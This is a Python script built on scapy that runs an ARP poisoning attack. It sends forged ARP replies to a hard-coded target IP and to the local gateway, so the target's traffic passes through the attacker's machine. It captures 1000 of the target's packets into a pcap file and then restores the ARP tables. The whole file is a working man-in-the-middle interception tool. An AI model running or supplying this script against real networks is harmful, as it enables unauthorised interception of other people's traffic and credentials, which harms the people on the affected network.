from scapy.all import *
import os
import sys
import threading
import signal


def restore_target(gateway, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target ... ")
    send(ARP(op=2, psrc=gateway, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # signal the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway, gateway_mac, target_ip, target_mac):

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway
    poison_gateway.hwdst = gateway_mac

    print("[*] Begining the ARP poison. [Ctrl+C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway, gateway_mac, target_ip, target_mac)

    print("ARP poison attack finished.")
    return


if __name__ == '__main__':

    interface = "Realtek PCIe GBE Family Controller"  # 11 Realtek PCIe GBE Family Controller
    target_ip = "192.168.40.13"  # 192.168.168.106
    gateway = "192.168.40.1"  # 192.168.168.1

    packet_count = 1000

    # set our interface
    conf.iface = interface

    # turn off output
    conf.verb = 0

    print(f"[*] Setting up {interface}")

    gateway_mac = get_mac(gateway)

    if gateway_mac is None:
        print("[!!!] Failed to get mac of the gateway. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Gateway {gateway} is at {gateway_mac}")

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print("[!!!] Failed to get mac of the target. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Target {target_ip} is at {target_mac}")

    # start poison thread
    poison_thread = threading.Thread(target=poison_target,
                                     args=(gateway, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print(f"[*] Starting sniffer for {packet_count} packets")
        bpf_filter = f"ip host {target_ip}"
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

        # write out the captured packets
        wrpcap('arper.pcap', packets)

        # restore the network
        restore_target(gateway, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        # restore the network
        restore_target(gateway, gateway_mac, target_ip, target_mac)
        sys.exit(0)

